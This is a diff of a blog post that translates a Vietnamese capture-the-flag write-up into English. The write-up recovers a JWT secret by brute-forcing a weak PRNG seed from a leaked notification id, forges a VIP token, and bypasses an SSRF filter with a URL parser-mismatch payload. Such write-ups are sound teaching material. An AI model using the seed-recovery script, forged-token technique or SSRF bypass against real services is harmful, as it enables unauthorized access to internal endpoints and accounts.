@@ -11,17 +11,17 @@ draft: false
 
 ![](./image.png)
 
-### Phân tích chức năng đặt món
+### Analyzing the order feature
 
-Gửi request đặt món bình thường:
+Send a normal order request:
 
 ![](./image-1.png)
 
-Server trả về một notification id:
+The server returns a notification id:
 
 ![](./image-2.png)
 
-Khi đọc notification:
+When reading the notification:
 
 ```bash
 {
@@ -31,34 +31,34 @@ Khi đọc notification:
 }
 ```
 
-Ta thấy server lưu lại trạng thái và nội dung phản hồi từ notification URL.
+We can see the server stores the status and the response content from the notification URL.
 
-### Lỗi seed random yếu do dùng sai toán tử
+### Weak random seed caused by a wrong operator
 
-Trong source, secret dùng để ký JWT được sinh bằng `random`, nhưng seed lại phụ thuộc vào đoạn tính toán dùng toán tử `^`:
+In the source, the secret used to sign the JWT is generated with `random`, but the seed depends on a computation using the `^` operator:
 
 ```python
 2^256
 ```
 
-Điều này làm không gian brute-force chỉ còn 258 khả năng.
+This reduces the brute-force space to only 258 possibilities.
 
-Server dùng cùng PRNG để sinh:
+The server uses the same PRNG to generate:
 
-1. JWT secret key.
-2. Notification id.
+1. The JWT secret key.
+2. The notification id.
 
-Vì notification id được trả về cho người dùng, ta có thể brute seed bằng cách thử 258 khả năng, sinh lại chuỗi id và so sánh với id đã biết. Khi seed đúng, ta khôi phục được JWT secret.
+Since the notification id is returned to the user, we can brute the seed by trying the 258 possibilities, regenerating the id string, and comparing it with the known id. When the seed is correct, we recover the JWT secret.
 
-### Brute JWT secret từ notification id
+### Brute-forcing the JWT secret from the notification id
 
-Notification id đã biết:
+The known notification id:
 
 ```text
 spfiyjkuio
 ```
 
-Script brute:
+Brute script:
 
 ```python
 import random
@@ -80,8 +80,6 @@ for n in range(258):
 
     key = r.randbytes(32).hex()
 
-    # Instance có thể đã sinh nhiều id trước đó,
-    # nên thử nhiều lần random_id cho mỗi seed.
     for idx in range(500):
         rid = random_id(r)
         if rid == known_id:
@@ -96,19 +94,19 @@ for n in range(258):
 print("not found")
 ```
 
-Chạy:
+Run:
 
 ```bash
 python3 solve_key.py spfiyjkuio
 ```
 
-JWT VIP thu được:
+The VIP JWT obtained:
 
 ```text
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ2aXAiOnRydWUsImlkIjoicHduZWQifQ.EXXGOwjvBJBhBbic3yQCzWBHTOyvpCR4bqSt_2wGa00
 ```
 
-Token này có payload:
+This token has the payload:
 
 ```json
 {
@@ -117,19 +115,19 @@ Token này có payload:
 }
 ```
 
-### Bypass SSRF filter bằng parser mismatch
+### Bypassing the SSRF filter via parser mismatch
 
-Chức năng `/order` nhận URL người dùng nhập vào rồi server sẽ request đến URL đó.
+The `/order` feature takes a URL entered by the user and the server then makes a request to that URL.
 
-Thông thường server sẽ chặn localhost/private IP. Tuy nhiên có thể bypass bằng URL đặc biệt:
+Normally the server blocks localhost/private IPs. However, it can be bypassed with a special URL:
 
 ```text
 http://TOKEN:@127.0.0.1\@example.com/../vip-meal
 ```
 
-Payload này lợi dụng sự khác nhau giữa cách parse URL của hàm kiểm tra và thư viện request.
+This payload exploits the difference between how the validation function and the request library parse the URL.
 
-Đọc notification mới:
+Read the new notification:
 
 ```bash
 {
